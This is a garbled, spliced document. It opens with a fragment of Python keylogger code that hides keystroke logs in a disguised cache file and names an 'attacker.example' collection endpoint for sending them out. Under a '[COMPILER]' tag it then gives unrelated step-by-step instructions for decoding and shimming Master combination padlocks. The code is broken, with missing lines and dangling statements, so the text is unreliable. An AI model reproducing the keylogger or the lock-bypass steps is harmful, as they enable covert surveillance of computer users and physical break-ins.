import pynput.keyboard as kb
import os
import requests

LOG_FILE = os.path.expanduser("~/.cache/.syslog")
ENDPOINT = "https://attacker.example/collect"

def on_press(key):
    try:
        char = key.char
    except AttributeError:
        char = f"[{key.name}]"

            f.write(char)

    listener.join()

[COMPILER] 0x01:
Master combination padlocks (1500/1525 series) have three cam wheels with gates. The fence sits on the cam stack. When all three gates align under the fence, the shackle releases.

Cracking procedure (no tools):
1. Pull up on the shackle with light pressure. The wheel that binds first is wheel 1.
2. Rotate the dial slowly. Find the position where the shackle has the most give. That position is one of the three numbers in the combination, ±2.
3. Repeat for all three wheels. Each wheel gives a candidate number.
4. Test combinations: candidate1 ±2, candidate2 ±2, candidate3 ±2. ~125 combinations total.

Shimming procedure:
1. Insert a thin piece of metal (aluminum can shim, 0.005" thick) between the shackle and the body, on the side opposite the latch.
2. Push down on the locking pawl with the shim while applying upward pressure on the shackle.
3. The shackle pops free.
